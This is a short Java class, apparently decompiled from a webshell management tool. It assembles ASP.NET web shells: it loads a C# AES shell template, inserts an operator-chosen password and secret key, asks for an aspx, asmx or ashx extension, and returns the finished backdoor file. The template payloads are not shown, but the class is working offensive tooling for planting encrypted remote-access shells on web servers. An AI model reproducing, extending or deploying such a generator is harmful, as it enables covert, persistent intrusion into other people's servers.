class Generate {
	private static final java.lang.String[] SUFFIX = new java.lang.String[]{ "aspx", "asmx", "ashx" };

	Generate() {
	}

	public static byte[] GenerateShellLoder(java.lang.String pass, java.lang.String secretKey, boolean isBin) {
		try {
			java.io.InputStream inputStream = shells.cryptions.cshapAes.Generate.class.getClassLoader().getResourceAsStream("shell/asp/template/" + (isBin ? "raw.bin" : "base64.bin"));
			java.lang.String code = new java.lang.String(util.functions.readInputStream(inputStream));
			inputStream.close();
			java.lang.String code2 = code.replace("{pass}", pass).replace("{secretKey}", secretKey);
			java.lang.Object selectedValue = javax.swing.JOptionPane.showInputDialog(((java.awt.Component) (null)), "suffix", "selected suffix", 1, ((javax.swing.Icon) (null)), shells.cryptions.cshapAes.Generate.SUFFIX, ((java.lang.Object) (null)));
			if (selectedValue == null) {
				return null;
			}
			java.io.InputStream inputStream2 = shells.cryptions.cshapAes.Generate.class.getClassLoader().getResourceAsStream("shell/asp/template/shell." + ((java.lang.String) (selectedValue)));
			java.lang.String template = new java.lang.String(util.functions.readInputStream(inputStream2));
			inputStream2.close();
			return template.replace("{code}", code2).getBytes();
		} catch (java.lang.Exception e) {
			util.Log.error(e);
			return null;
		}
	}

	public static void main(java.lang.String[] args) {
		java.lang.System.out.println();
	}
}